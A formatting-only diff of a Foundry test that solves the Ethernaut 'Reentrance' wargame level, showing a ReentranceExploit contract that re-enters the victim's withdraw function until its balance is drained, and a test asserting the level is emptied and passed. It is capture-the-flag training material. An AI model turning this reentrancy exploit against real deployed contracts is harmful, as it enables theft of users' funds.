@@ -13,7 +13,7 @@ contract ReentranceExploit {
     }
 
     function attack(uint256 amount) external {
-        (bool success, ) = victim.call(abi.encodeWithSignature("withdraw(uint256)", amount));
+        (bool success,) = victim.call(abi.encodeWithSignature("withdraw(uint256)", amount));
         require(success);
     }
 
@@ -21,7 +21,7 @@ contract ReentranceExploit {
         if (victim.balance == 0) {
             return;
         }
-        (bool success, ) = victim.call(abi.encodeWithSignature("withdraw(uint256)", victim.balance));
+        (bool success,) = victim.call(abi.encodeWithSignature("withdraw(uint256)", victim.balance));
         require(success);
     }
 }
@@ -29,7 +29,7 @@ contract ReentranceExploit {
 contract ReentranceTest is Test {
     Ethernaut ethernaut;
     address me = makeAddr("me");
-    
+
     function setUp() external {
         ethernaut = new Ethernaut();
     }
@@ -41,19 +41,18 @@ contract ReentranceTest is Test {
 
         vm.startPrank(me);
         vm.deal(me, 2 ether);
-        address levelAddress = ethernaut.createLevelInstance{value: 1 ether}(factory);
+        address levelAddress = ethernaut.createLevelInstance{ value: 1 ether }(factory);
         Reentrance reentrancy = Reentrance(payable(levelAddress));
 
         // attack
         ReentranceExploit exploit = new ReentranceExploit(address(reentrancy));
-        reentrancy.donate{value: 1 ether}(address(exploit));
+        reentrancy.donate{ value: 1 ether }(address(exploit));
         exploit.attack(1 ether);
         assertEq(address(reentrancy).balance, 0);
-        
+
         // submission
         bool levelPassed = ethernaut.submitLevelInstance(payable(levelAddress));
         vm.stopPrank();
         assert(levelPassed);
     }
 }
-
